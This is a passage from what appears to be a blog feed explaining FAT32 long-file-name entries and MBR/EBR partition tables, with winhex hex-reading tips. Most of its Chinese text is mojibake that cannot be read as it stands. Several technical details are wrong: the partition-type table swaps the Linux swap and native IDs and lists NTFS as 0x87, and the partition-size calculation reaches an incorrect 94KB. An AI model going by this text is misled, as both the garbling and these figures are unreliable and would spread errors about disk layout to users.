32ä¸ªå­—èŠ‚å°å•ä½çš„å¯¹åº”ä½ç½®ä¸Šçš„å­—èŠ‚ç›¸åŒï¼Œè¯´æ˜å®ƒä»¬æ˜¯åŒä¸€ä¸ªé•¿æ–‡ä»¶åéƒ¨åˆ†ã€‚</p></li><li><p>çŸ­æ–‡ä»¶åéƒ¨åˆ†</p><p>å†å¼ºè°ƒä¸€ä¸‹ï¼šèµ·å§‹ç°‡å·æ˜¯ä½äºä¸¤ä¸ªéƒ¨åˆ†ï¼Œè¦è¿èµ·æ¥å³å¯ã€‚</p></li><li><p>é•¿æ–‡ä»¶åç›®å½•ç™»è®°é¡¹çš„è¯†åˆ«?</p><p>å®ƒåŒºåˆ«äºæ™®é€šçš„ FAT32 çŸ­æ–‡ä»¶åç›®å½•ç™»è®°é¡¹çš„ç‰¹å¾æœ‰ä»¥ä¸‹ä¸‰ç‚¹ï¼š</p><ol type="1"><li>æ¯ 32 ä¸ªå­—èŠ‚çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„ 3-7 ä½çš„å€¼ï¼Œå³:é¡ºåºå·</li><li>"0F" é•¿æ–‡ä»¶åéƒ¨åˆ†çš„æ ‡å¿—</li><li>åŒä¸€æ–‡ä»¶æ ‡è¯†ç¬¦ï¼Œä¸€è¡Œçš„å€’æ•°ç¬¬ä¸‰ä¸ªå­—èŠ‚</li><li>winhex å³ä¾§æ å­—ç¬¦ä¸­çš„æ³¢æµªçº¿</li></ol></li><li><p>æ ¹æ®å³ä¾§å­—ç¬¦æ çœ‹æ–‡ä»¶å</p><p>ç”±äºæ ¼å¼ä¸­ä¸€äº›å­—èŠ‚çš„å½±å“ï¼Œå¤ªè¿‡å¤æ‚çš„é•¿æ–‡ä»¶åçœ‹å³ä¾§å­—ç¬¦æ åº”è¯¥è¯»ä¸å¤ªå‡†ã€‚ä¸è¿‡ï¼Œæƒ³æ¥ï¼Œè€ƒè¯•æˆ–å¹³æ—¶åªéœ€è¦çœ‹äº›ç®€å•çš„æˆ–è€…ç®€å•äº†è§£ä¸€ä¸‹åå­—è€Œå·²ã€‚</p><p>ä»¥ä¸Šå›¾çš„é•¿æ–‡ä»¶åä¸ºä¾‹å­ï¼šçŸ­æ–‡ä»¶åéƒ¨åˆ†ï¼Œåªæœ‰ç¬¬ä¸€è¡Œè¯»å–çŸ­æ–‡ä»¶åï¼Œè¿™é‡Œæ˜¯: 007286~1GIFé•¿æ–‡ä»¶åéƒ¨åˆ†(å®Œæ•´çš„æ–‡ä»¶å)ï¼Œæ¯ä¸¤è¡Œ(32 ä¸ªå­—èŠ‚)ä¸ºä¸€ä¸ªå•ä½ã€‚è¯»æ³•:å•å…ƒé—´ç”±ä¸‹åˆ°ä¸Šï¼Œå•å…ƒå†…ä»ä¸Šåˆ°ä¸‹ï¼Œä»å·¦å¾€å³ã€‚ è¿™é‡Œæ˜¯: 007286Telylgc8j3iqlxmg307s 0d54qw.gif è¯»å–é•¿æ–‡ä»¶åæ—¶ï¼Œè¦æ³¨æ„é•¿æ–‡ä»¶ç»“æŸå­—èŠ‚(è¿™é‡Œä¸º 43)çš„å­—ç¬¦å½±å“ï¼Œä¸€èˆ¬è¯¥è¡Œç¬¬ä¸€ä¸ªå­—ç¬¦å»æ‰ã€‚</p></li></ol><p>é•¿æ–‡ä»¶åå®ç°æ³¨æ„äº‹é¡¹:</p><ul><li>é•¿æ–‡ä»¶åå ç”¨è¾ƒå¤šçš„ç›®å½•ç™»è®°é¡¹ï¼Œç›®å½•ç™»è®°é¡¹æ•°æ®ä¸€èˆ¬ä¸º 512 ä¸ª</li><li>åœ¨æ ¹ç›®å½•ä¸‹æœ€å¤šèƒ½å­˜å‚¨ 46 ä¸ªè¿™æ ·çš„é•¿æ–‡ä»¶æˆ–ç›®å½•</li><li>ä½¿ç”¨ 16 ä½åº”ç”¨ç¨‹åºæ—¶ï¼Œæ›´æ”¹æ–‡ä»¶åï¼Œå¯¹åº”çš„é•¿æ–‡ä»¶åå°†ä¸¢å¤±</li><li>é•¿æ–‡ä»¶åæ›´åæˆ–åˆ é™¤æ—¶ï¼Œé•¿æ–‡ä»¶åå°†ä¸¢å¤±ï¼Œé•¿æ–‡ä»¶åä¾é™„çš„çŸ­æ–‡ä»¶åå­˜åœ¨</li><li>é¢‘ç¹åˆ›å»ºå’Œåˆ é™¤é•¿æ–‡ä»¶åï¼Œä¼šé€ æˆå¤§é‡ç£ç›˜ç¢ç‰‡ é¿å…æ–¹å¼<ol type="1"><li>ä¸åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºé•¿æ–‡ä»¶å</li><li>ç£ç›˜ç¢ç‰‡æ•´ç†ç¨‹åºå›æ”¶ä¸¢å¤±çš„ç›®å½•ç™»è®°é¡¹</li></ol></li></ul><p>æœªå®Œå¾…ç»­..</p><ul class="task-list"><li><label><input type="checkbox" />æ–‡ä»¶å»ºç«‹</label></li><li><label><input type="checkbox" />æ–‡ä»¶åˆ é™¤</label></li><li><label><input type="checkbox" />å–è¯åˆ†æ-æ•°æ®éšè—</label></li></ul><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="http://www.data-recovery-app.com/datarecovery/fdt.html">datarecovery FDT</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Computer </tag>
            
            <tag> FDT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Boot Sector</title>
      <link href="/blog/2020/04/24/os/0.boot_sector/"/>
      <url>/blog/2020/04/24/os/0.boot_sector/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><blockquote><p>A boot sector is the sector of a persistent data storage device (e.g.hard disk, floppy disk, optical disc, etc.) which contains machine codeto be loaded into random-access memory (RAM) and then executed by acomputer system's built-in firmware -- Wikipedia</p></blockquote><h2 id="mbr-ç®€ä»‹">MBR ç®€ä»‹</h2><p>å¼•å¯¼æ‰‡åŒºï¼ˆBoot Sectorï¼‰ï¼Œåˆç§°ä¹‹ä¸ºå¼•å¯¼å—ï¼ˆBootBlock)æ˜¯ç¡¬ç›˜ã€è½¯ç›˜æˆ–å…¶å®ƒæ•°æ®å­˜å‚¨è®¾å¤‡ä¸Šçš„ä¸€ä¸ªåŒ…å«å¼•å¯¼ä»£ç çš„åŒºåŸŸï¼Œè¿™äº›ä»£ç å¯ä»¥ç”±è®¡ç®—æœºç³»ç»Ÿçš„å†…ç½®å›ºä»¶(firmware)åŠ è½½åˆ°å†…å­˜ä¸­ç›´æ¥è¿è¡Œã€‚ä¸»è¦æœ‰ä¸¤ç§ç±»å‹ï¼šMBRå’Œ PBRï¼ˆVBRï¼‰ã€‚</p><p>ä¸»å¼•å¯¼è®°å½•(MBR, Master Boot Record)ï¼š</p><blockquote><p>The Master Boot Record (MBR) is the information in the first sectorof any hard disk or diskette that identifies how and where an operatingsystem is located so that it can be boot (loaded) into the computer'smain storage or random access memory.</p></blockquote><p>ä¸»å¼•å¯¼è®°å½• MBR æ˜¯å­˜å‚¨åœ¨ä¸»å¼•å¯¼æ‰‡åŒº MBSé‡Œé¢çš„æ•°æ®å†…å®¹ï¼Œå› æ­¤å¸¸å¸¸å°†äºŒè€…æ··ä¸ºä¸€è°ˆï¼Œæ…¢æ…¢åœ°ä¸»å¼•å¯¼æ‰‡åŒº MBSçš„æ¦‚å¿µå°±æœ‰äº›æ·¡åŒ–äº†ï¼Œå°±å¹²è„†å«åš MBR æ‰‡åŒºäº†ã€‚åŒç†ï¼ŒPBR ä¸ PBSçš„å…³ç³»ä¹Ÿç±»ä¼¼ã€‚</p><p>æ‰€ä»¥ä½ ç°åœ¨å¾€å¾€å¯ä»¥çœ‹åˆ°è¿™æ ·çš„ MBR è§£é‡Šï¼š</p><blockquote><p>A master boot record (MBR) is a special type of boot sector at thevery beginning of partitioned computer mass storage devices like fixeddisks or removable drives intended for use with IBM PC-compatiblesystems and beyond. -- Wikipedia</p></blockquote><p>å¯¹äºä¼ ç»Ÿçš„ PC æœºç¡¬ç›˜è€Œè¨€ï¼Œæ¯ä¸ªç¡¬ç›˜çš„ 0 æŸ±é¢ 0 ç£å¤´ 1 æ‰‡åŒºéƒ½æœ‰ä¸€ä¸ªMaster Boot Sector (MBS ä¸»å¼•å¯¼æ‰‡åŒº), ä¹Ÿå°±æ˜¯è¯¥ç¡¬ç›˜çš„ MBRæ‰€åœ¨çš„ä½ç½®ã€‚ç¡¬ç›˜çš„æ¯ä¸ª<strong>åˆ†åŒº</strong>çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºåˆ™æ˜¯è¯¥åˆ†åŒºçš„åˆ†åŒºå¼•å¯¼æ‰‡åŒºï¼ˆPartitionBoot Sector)ï¼Œä¹Ÿå°±æ˜¯è¯¥åˆ†åŒº PBRï¼ˆPartition Boot Record) æ‰€åœ¨çš„ä½ç½®ã€‚MBRå ç”¨ 512ä¸ªå­—èŠ‚ï¼Œå®ƒç”¨äºç¡¬ç›˜å¯åŠ¨æ—¶å°†ç³»ç»Ÿæ§åˆ¶æƒè½¬ç»™ç”¨æˆ·æŒ‡å®šçš„ã€åœ¨åˆ†åŒºè¡¨ä¸­ç™»è®°äº†æŸä¸ªæ“ä½œç³»ç»Ÿçš„åˆ†åŒºçš„å¼•å¯¼æ‰‡åŒºã€‚</p><blockquote><p>æ³¨ï¼šç›˜é¢å·åˆç§°ç£å¤´å·ï¼Œæ¯ä¸ªç›˜é¢å¯¹åº”ä¸€ä¸ªç£å¤´ã€‚</p></blockquote><h3 id="mbr-ç‰¹ç‚¹">MBR ç‰¹ç‚¹</h3><ul><li>MBR çš„å†…å®¹æ˜¯åœ¨ç¡¬ç›˜åˆ†åŒºæ—¶ç”±åˆ†åŒºè½¯ä»¶ï¼ˆå¦‚ FDISKï¼‰å†™å…¥è¯¥æ‰‡åŒºçš„</li><li>MBR ä¸å±äºä»»ä½•ä¸€ä¸ªæ“ä½œç³»ç»Ÿï¼Œä¸éšæ“ä½œç³»ç»Ÿçš„ä¸åŒè€Œä¸åŒï¼Œå³ä½¿ä¸åŒï¼ŒMBRä¹Ÿä¸ä¼šå¤¹å¸¦æ“ä½œç³»ç»Ÿçš„æ€§è´¨ï¼Œå…·æœ‰å…¬å…±å¼•å¯¼çš„ç‰¹æ€§ï¼Œä½†å®‰è£…æŸäº›å¤šé‡å¼•å¯¼åŠŸèƒ½çš„è½¯ä»¶æˆ–LINUX çš„ LILO æ—¶æœ‰å¯èƒ½æ”¹å†™å®ƒ</li><li>MBRå…ˆäºæ‰€æœ‰çš„æ“ä½œç³»ç»Ÿè¢«è°ƒå…¥å†…å­˜å¹¶å‘æŒ¥ä½œç”¨ï¼Œç„¶åæ‰å°†æ§åˆ¶æƒäº¤ç»™æ´»åŠ¨ä¸»åˆ†åŒºå†…çš„æ“ä½œç³»ç»Ÿã€‚</li><li>è¯¥æ‰‡åŒºä¸ºéšè—æ‰‡åŒºï¼Œå®é™…ä¸Šï¼Œ0 ç£å¤´ 0æŸ±é¢çš„æ‰‡åŒºå‡ä¸ºéšè—æ‰‡åŒºï¼Œä¸€èˆ¬çš„ç¡¬ç›˜è®¿é—®å‘½ä»¤æ— æ³•è®¿é—®ï¼Œå› æ­¤ MBRåˆ†åŒºè¡¨æ”¾åœ¨æ­¤å¤„æ¯”è¾ƒå®‰å…¨ï¼Œä¸å®¹æ˜“é­åˆ°ç ´åï¼ŒåŒç†ï¼Œè®¸å¤šç—…æ¯’ä¹Ÿä¼ºæœºéšè—åœ¨è¿™é‡Œï¼Œä¸å®¹æ˜“è¢«æŸ¥æ€ã€‚</li><li>å¯¹äº PCæœºä»¥åŠå…¼å®¹æ¶æ„çš„ç³»ç»Ÿè€Œè¨€ï¼Œä¸»å¼•å¯¼è®°å½•åªæœ‰å­˜å‚¨åœ¨å¯å¼•å¯¼è®¾å¤‡çš„å¼•å¯¼æ‰‡åŒºé‡Œæ‰èƒ½å¼•å¯¼ç³»ç»Ÿã€‚è¿™æ˜¯è¿™ç§ç³»ç»Ÿæ¶æ„çš„è®¾è®¡æ‰€è§„å®šçš„å·¥ä½œæ–¹å¼ã€‚</li></ul><h3 id="mbr-layout">MBR Layout</h3><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200417092542.png"alt="Structure of a classical generic MBR from Wikipedia" /><figcaption aria-hidden="true">Structure of a classical generic MBR fromWikipedia</figcaption></figure><p>ä¸­æ–‡ç‰ˆ: <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204181587193302268.png"alt="æ ‡å‡† MBR ç»“æ„" /></p><p>MBR 512 å­—èŠ‚ï¼Œä¸»è¦ç”±ä¸‰éƒ¨åˆ†æ„æˆ:</p><ol type="1"><li><p>å¼•å¯¼ç¨‹åºä»£ç (Bootstrap code)ï¼Œæœ€å¤§å  446 å­—èŠ‚</p><p>æœ€å 6 ä¸ªå­—èŠ‚ä¸º å››ä¸ªå­—èŠ‚çš„ Windows disk signature å’Œä¿ç•™å¾…ç”¨çš„ä¸¤å­—èŠ‚0x0000</p></li><li><p>ç¡¬ç›˜åˆ†åŒºè¡¨ DPT(Disk Partition table for primary partitions)ï¼Œå 64 å­—èŠ‚</p><p>ç¡¬ç›˜åˆ†åŒºæœ‰å¾ˆå¤šç”¨å¤„ã€‚è€ƒè™‘åˆ°æ¯ä¸ªåŒºå¯ä»¥å®‰è£…ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œå› æ­¤ä¸»å¼•å¯¼è®°å½•å¿…é¡»çŸ¥é“å°†æ§åˆ¶æƒè½¬äº¤ç»™å“ªä¸ªåŒºã€‚åˆ†åŒºè¡¨çš„é•¿åº¦åªæœ‰ 64 ä¸ªå­—èŠ‚ï¼Œé‡Œé¢åˆ<strong>åˆ†æˆå››é¡¹ï¼Œæ¯é¡¹ 16ä¸ªå­—èŠ‚</strong>ã€‚æ‰€ä»¥ï¼Œä¸€ä¸ªç¡¬ç›˜æœ€å¤šåªèƒ½åˆ†å››ä¸ªä¸€çº§åˆ†åŒºï¼Œåˆå«åš"ä¸»åˆ†åŒº"ã€‚</p><p>æ¯ä¸ªä¸»åˆ†åŒºçš„ 16 ä¸ªå­—èŠ‚ï¼Œç”± 6ä¸ªéƒ¨åˆ†ç»„æˆï¼Œè¯¦ç»†ç»„æˆåœ¨ä¸‹é¢æœ‰å†™åˆ°ã€‚</p></li><li><p>ä¸»å¼•å¯¼æ‰‡åŒºç»“æŸæ ‡å¿—(Boot signature)</p><p>ä¹Ÿæœ‰ç§°ä¹‹ä¸º BRID(boot record IDï¼Œå¼•å¯¼è®°å½•æ ‡è¯†) çš„ã€‚ 0xAA55æ˜¯åˆ¤åˆ«å¼•å¯¼åŒºæ˜¯å¦æœ‰æ•ˆåˆæ³•çš„æ ‡å¿—ã€‚â€œ55AAâ€ æ ‡å¿—é€šçŸ¥ç³»ç»Ÿï¼šè¯¥ MBRæ‰‡åŒºæ˜¯å¦æœ‰æ•ˆï¼Œå¦‚æœè¯¥æ ‡å¿—ä¸¢å¤±æˆ–æŸåï¼Œç£ç›˜å°†ä¼šæ˜¾ç¤ºä¸ºæœªåˆå§‹åŒ–ã€‚</p><p>BRID çš„ä¸»è¦ä½œç”¨å°±æ˜¯åˆ¤æ–­è¯¥è®¾å¤‡æ˜¯å¦å¯ä»¥ç”¨äºå¯åŠ¨ã€‚BIOSæŒ‰ç…§â€œå¯åŠ¨é¡ºåºâ€ï¼ŒæŠŠæ§åˆ¶æƒè½¬äº¤ç»™æ’åœ¨ç¬¬ä¸€ä½çš„å‚¨å­˜è®¾å¤‡ã€‚è¿™æ—¶ï¼Œè®¡ç®—æœºè¯»å–è¯¥è®¾å¤‡çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼Œä¹Ÿå°±æ˜¯è¯»å–æœ€å‰é¢çš„512 ä¸ªå­—èŠ‚ã€‚å¦‚æœè¿™ 512 ä¸ªå­—èŠ‚çš„æœ€åä¸¤ä¸ªå­—èŠ‚æ˜¯ 0x55 å’Œ0xAAï¼Œè¡¨æ˜è¿™ä¸ªè®¾å¤‡å¯ä»¥ç”¨äºå¯åŠ¨ï¼›å¦‚æœä¸æ˜¯ï¼Œè¡¨æ˜è®¾å¤‡ä¸èƒ½ç”¨äºå¯åŠ¨ï¼Œæ§åˆ¶æƒäºæ˜¯è¢«è½¬äº¤ç»™â€œå¯åŠ¨é¡ºåºâ€ä¸­çš„ä¸‹ä¸€ä¸ªè®¾å¤‡ã€‚å…¶å®ä¸»å¼•å¯¼è®°å½•çš„ä¸»è¦ä½œç”¨å°±æ˜¯å‘Šè¯‰è®¡ç®—æœºåˆ°ç¡¬ç›˜çš„å“ªä¸€ä¸ªä½ç½®å»æ‰¾æ“ä½œç³»ç»Ÿã€‚</p></li></ol><p>winhex å®šä½åˆ° MBR çš„å›¾(è¾…åŠ©ç†è§£):</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200418153411.png"alt="MBR hex" /><figcaption aria-hidden="true">MBR hex</figcaption></figure><h3 id="äººå·¥å¿«é€Ÿåˆ’åˆ†-mbr">äººå·¥å¿«é€Ÿåˆ’åˆ† MBR</h3><p>æ‹¿åˆ°ä¸€ä¸ª winhex å±•ç¤ºçš„ MBR æ—¶ï¼Œå¦‚ä½•äººå·¥å¿«é€Ÿåˆ’åˆ†å…¶ç»“æ„ï¼Ÿ</p><ol type="1"><li><p>ç¡®å®š 55AA æ ‡å¿—</p></li><li><p>å‘ä¸Šæ•°å››è¡Œï¼Œåˆ’åˆ†å‡º DPTï¼Œç£ç›˜åˆ†åŒºè¡¨ã€‚ æ•°å››è¡Œæ˜¯å› ä¸º winhexç­‰éƒ½æ˜¯ä¸€è¡Œä» 0x0-0xFï¼Œ 16 ä¸ªå­—èŠ‚ï¼Œ 4 è¡Œæ­£å¥½æ˜¯ 64 å­—èŠ‚ï¼Œ å³: DPTçš„å¤§å°</p></li><li><p>å®Œæˆ 1ï¼Œ2 æ­¥åï¼Œå†å‘ä¸Šå…¨éƒ¨éƒ½æ˜¯å¼•å¯¼ä»£ç äº†ã€‚å…¶ä¸­ï¼Œå‘ä¸Šä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€èˆ¬ä¸ºç©ºå€¼ï¼Œ 0x0000 å†å‘ä¸Šå››ä¸ªå­—èŠ‚ï¼Œåœ¨æœ¬å›¾ä¸­ä¸º "7C95 5A 1F"ï¼Œå³ï¼šwindows ç£ç›˜ç­¾å</p></li><li><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦ä¸“æ³¨äºç£ç›˜åˆ†åŒºè¡¨äº†</p><p>ç£ç›˜åˆ†åŒºè¡¨ DPT(64 å­—èŠ‚) | å­—èŠ‚ | é•¿åº¦ | å®šä¹‰ | | :---------: | :---:|:-------------------------------------------------------------------------------------:| | ç¬¬ 1 ä¸ªå­—èŠ‚ | 1 | <strong>0x00 è¡¨ç¤ºéæ´»åŠ¨åˆ†åŒºï¼Œ0x80è¡¨ç¤ºæ´»åŠ¨åˆ†åŒºï¼Œå››ä¸ªåˆ†åŒºæœ€å¤šæœ‰ä¸€ä¸ªæ¿€æ´»åˆ†åŒº</strong> | | ç¬¬ 2~4 å­—èŠ‚ | 3 |è¯¥åˆ†åŒºç¬¬ä¸€ä¸ªæ‰‡åŒºçš„ç‰©ç†ä½ç½® | | ç¬¬ 5 ä¸ªå­—èŠ‚ | 1 |<strong>åˆ†åŒºç±»å‹</strong> | | ç¬¬ 6~8 å­—èŠ‚ | 3 |è¯¥åˆ†åŒºæœ€åä¸€ä¸ªæ‰‡åŒºçš„ç‰©ç†ä½ç½® | | ç¬¬ 9-12 å­—èŠ‚ | 4 |è¯¥åˆ†åŒºç¬¬ä¸€ä¸ªæ‰‡åŒºçš„é€»è¾‘åœ°å€ï¼ˆä¹Ÿå«æœ¬åˆ†åŒºä¹‹å‰çš„æ‰‡åŒºæ•°ï¼ŒSector precedingPartition x(åˆ†åŒºåºå·)ï¼‰ | | ç¬¬ 13-16 å­—èŠ‚ | 4 |<strong>è¯¥åˆ†åŒºçš„æ‰‡åŒºæ€»æ•°</strong> |</p><p>æ ¹æ®ç¡¬ç›˜åˆ†åŒºè¡¨çš„æ ¼å¼ï¼Œåˆ†æå¦‚ä¸‹åˆ†åŒºè¡¨çš„ç¬¬ä¸€ä¸ªåˆ†åŒºï¼š <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200418172123.png"alt="20200418172123" /></p><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ</p><p>ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼š0x00 ä»£è¡¨éæ´»åŠ¨åˆ†åŒº ç¬¬äº”ä¸ªå­—èŠ‚ï¼šåˆ†åŒºç±»å‹ 0x0Cï¼Œ æŸ¥<ahref="https://en.wikipedia.org/wiki/Partition_type">åˆ†åŒºæ ‡è¯†å¯¹ç…§è¡¨</a>å¯å¾—å…¶ä¸º:FAT32</p><p>å¸¸è§åˆ†åŒºç±»å‹è¡¨(å¦‚æœæŸ¥ä¸åˆ°ï¼Œä¸ä»£è¡¨æ²¡æœ‰ï¼Œè¯¦ç»†å…¨é¢çš„ç±»å‹è¡¨è¯·çœ‹ä¸Šä¸€è¡Œçš„wiki é“¾æ¥)ï¼š | Partition ID | type | | ------------ |---------------------- | | 0x00 | <strong>ç©ºï¼Œä¸å…è®¸ä½¿ç”¨</strong> | |0x04 | <strong>FAT16 æ ¼å¼ï¼ˆ&lt;32Mï¼‰</strong> | | 0x05 |<strong>æ‰©å±•åˆ†åŒº</strong> | | 0x06 | <strong>FAT16</strong> | | 0x0E |<strong>Win95 FAT16</strong> | | 0x0C | <strong>Win95 FAT32</strong> ||0x0B| <strong>FAT32 with CHS addressing</strong>| | 0x82 |<strong>Linux Native åˆ†åŒº</strong> | | 0x83 | <strong>Linux Swapåˆ†åŒº</strong> | | 0x87 | <strong>NTFS</strong> | | 0xA6 | Open BSD | |0xA5 | FreeBSD |</p><p><strong>è®¡ç®—è¯¥åˆ†åŒºçš„å­—èŠ‚æ•°</strong>ï¼š æœ¬åˆ†åŒºæ€»æ‰‡åŒºæ•°: æ ¹æ®ç¬¬ 13-16å­—èŠ‚ï¼Œå¾—çŸ¥ä¸º 0x00017800(â€­96256â€¬)ï¼Œåˆå› ä¸ºæ¯ä¸ªæ‰‡åŒºæ˜¯ 512 å­—èŠ‚å› æ­¤ï¼Œè¯¥åˆ†åŒºçš„å¤§å°ï¼š<code>(96256â€¬*512)/(2^10)=94KB</code></p><p>æœ€åçš„å››ä¸ªå­—èŠ‚(ç¬¬ 13-16 å­—èŠ‚)æ˜¯ä¸»åˆ†åŒºçš„æ‰‡åŒºæ€»æ•°ï¼Œå†³å®šäº†è¿™ä¸ªä¸»åˆ†åŒºçš„é•¿åº¦ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªä¸»åˆ†åŒºçš„æ‰‡åŒºæ€»æ•°æœ€å¤šä¸è¶…è¿‡2 çš„ 32 æ¬¡æ–¹ã€‚ï¼Œå¦‚æœæ¯ä¸ªæ‰‡åŒºä¸º 512 ä¸ªå­—èŠ‚ï¼Œå°±æ„å‘³ç€å•ä¸ªåˆ†åŒºæœ€å¤§ä¸è¶…è¿‡2TBã€‚å†è€ƒè™‘åˆ°æ‰‡åŒºçš„é€»è¾‘åœ°å€ä¹Ÿæ˜¯ 32ä½ï¼Œæ‰€ä»¥å•ä¸ªç¡¬ç›˜å¯åˆ©ç”¨çš„ç©ºé—´æœ€å¤§ä¹Ÿä¸è¶…è¿‡ 2TBã€‚å¦‚æœæƒ³ä½¿ç”¨æ›´å¤§çš„ç¡¬ç›˜ï¼Œåªæœ‰2ä¸ªæ–¹æ³•ï¼šä¸€æ˜¯æé«˜æ¯ä¸ªæ‰‡åŒºçš„å­—èŠ‚æ•°ï¼ŒäºŒæ˜¯å¢åŠ æ‰‡åŒºæ€»æ•°ã€‚ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œäººä»¬å‘æ˜äº†GPT åˆ†åŒºã€‚</p></li></ol><p>è‡³æ­¤ï¼Œå¯¹ MBR çš„åˆ†æåŸºæœ¬ç»“æŸã€‚</p><h2 id="ebr">EBR</h2><p>éšç€ç¡¬ç›˜è¶Šæ¥è¶Šå¤§ï¼Œå››ä¸ªä¸»åˆ†åŒºå·²ç»ä¸å¤Ÿäº†ï¼Œéœ€è¦æ›´å¤šçš„åˆ†åŒºã€‚ä½†æ˜¯é€šè¿‡ä¸»å¼•å¯¼è®°å½•MBR å®šä¹‰çš„ç¡¬ç›˜åˆ†åŒºè¡¨åªèƒ½æè¿° 4ä¸ªåˆ†åŒºï¼Œå› æ­¤å‡ºäºæ‹“å±•çš„éœ€è¦ï¼Œè§„å®šæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªåŒºå¯ä»¥è¢«å®šä¹‰æˆ"æ‰©å±•åˆ†åŒº"ï¼ˆExtendedpartitionï¼‰ã€‚</p><p>æ‰€è°“"æ‰©å±•åˆ†åŒº"ï¼Œå°±æ˜¯æŒ‡è¿™ä¸ªåˆ†åŒºé‡Œé¢åˆåˆ†æˆå¤šä¸ªåˆ†åŒºã€‚<strong>è¿™ç§åˆ†åŒºé‡Œé¢çš„åˆ†åŒºï¼Œå°±å«åš"é€»è¾‘åˆ†åŒº"</strong>ï¼ˆlogicalpartitionï¼‰ã€‚</p><p>æ‰©å±•åˆ†åŒºçš„ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼Œå«åš"æ‰©å±•å¼•å¯¼è®°å½•"ï¼ˆExtended bootrecordï¼Œç¼©å†™ä¸º EBRï¼‰ã€‚å®ƒé‡Œé¢<strong>ä¹ŸåŒ…å«ä¸€å¼  64å­—èŠ‚çš„åˆ†åŒºè¡¨</strong>ï¼Œ<strong>ä½†æ˜¯æœ€å¤šåªæœ‰ä¸¤é¡¹ï¼ˆä¹Ÿå°±æ˜¯ä¸¤ä¸ªé€»è¾‘åˆ†åŒºï¼‰</strong>ã€‚</p><p>é‚£å¦‚æœæˆ‘ä»¬å¸Œæœ›é€»è¾‘åˆ†åŒºä¸æ­¢ä¸¤ä¸ªï¼Œæ€ä¹ˆå®ç°å‘¢ï¼Ÿæˆ‘ä»¬å¾€å¾€é‡‡å–ç±»ä¼¼äºå•é“¾è¡¨çš„ç»“æ„ï¼Œå…¶ä¸­å››ä¸ªä¸»åˆ†åŒºè¡¨é¡¹ä¸­çš„ä¸€ä¸ªå½“åšå•é“¾è¡¨çš„èµ·å§‹å¤´ï¼Œæè¿°å¤šä½™ç£ç›˜å®¹é‡ï¼Œå³ï¼šæ‰©å±•åˆ†åŒºã€‚è¯¥åˆ†åŒºè¡¨é¡¹è®°å½•ç¬¬ä¸€ä¸ªé€»è¾‘åˆ†åŒºçš„åœ°å€ï¼ˆç¬¬ä¸€ä¸ªé€»è¾‘åˆ†åŒºçš„EBR çš„åœ°å€ï¼‰ï¼Œè€Œ EBRä¸­ä¸¤ä¸ªåˆ†åŒºè¡¨é¡¹ï¼šä¸€é¡¹è®°å½•è¯¥é€»è¾‘åˆ†åŒº(é€»è¾‘é©±åŠ¨å™¨)çš„ä½ç½®ï¼Œå¦ä¸€é¡¹è®°å½•ä¸‹ä¸€ä¸ªé€»è¾‘åˆ†åŒºçš„åœ°å€ï¼ˆç¬¬äºŒä¸ªé€»è¾‘åˆ†åŒºçš„EBRçš„åœ°å€ï¼‰ï¼Œå°±è¿™æ ·ä¸€ç›´é“¾æ¥ä¸‹å»ï¼Œç›´åˆ°æŸä¸ªé€»è¾‘åˆ†åŒºçš„åˆ†åŒºè¡¨åªåŒ…å«å®ƒè‡ªèº«ä¸ºæ­¢ï¼ˆå³åªæœ‰ä¸€ä¸ªåˆ†åŒºé¡¹ï¼‰ã€‚å› æ­¤ï¼Œæ‰©å±•åˆ†åŒºå¯ä»¥åŒ…å«æ— æ•°ä¸ªé€»è¾‘åˆ†åŒºã€‚</p><p>ç³»ç»Ÿåœ¨å¯åŠ¨æ—¶æŒ‰ç…§åˆ†åŒºé“¾çš„é“¾æ¥é¡ºåºæŸ¥æ‰¾åˆ†åŒºã€‚å½“ç„¶ï¼Œè‹¥åˆ†åŒºé“¾æˆç¯ï¼Œç»“æœå°±æ˜¯ï¼šç³»ç»Ÿæ— æ³•å¼•å¯¼ï¼Œæ„æˆç¡¬ç›˜é€»è¾‘é”</p><p>å…³äº MBRï¼Œ EBR çš„é€»è¾‘ç»“æ„ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200422201415.png"alt="MBR&amp;EBR" /><figcaption aria-hidden="true">MBR&amp;EBR</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200422212959.png"alt="EBR" /><figcaption aria-hidden="true">EBR</figcaption></figure><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ Windowsç³»ç»Ÿä¸€èˆ¬åªåˆ’åˆ†ä¸€ä¸ªä¸»åˆ†åŒºç»™ç³»ç»Ÿï¼Œå‰©ä½™çš„éƒ¨åˆ†å…¨éƒ¨åˆ’å…¥æ‰©å±•åˆ†åŒº,ä¹Ÿå°±æ˜¯è¿™æ ·ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200821223428.png"alt="Windows partitions" /><figcaption aria-hidden="true">Windows partitions</figcaption></figure><p>è¿™é‡Œæœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ï¼š</p><ol type="1"><li>åœ¨ MBR åˆ†åŒºè¡¨ä¸­æœ€å¤š 4 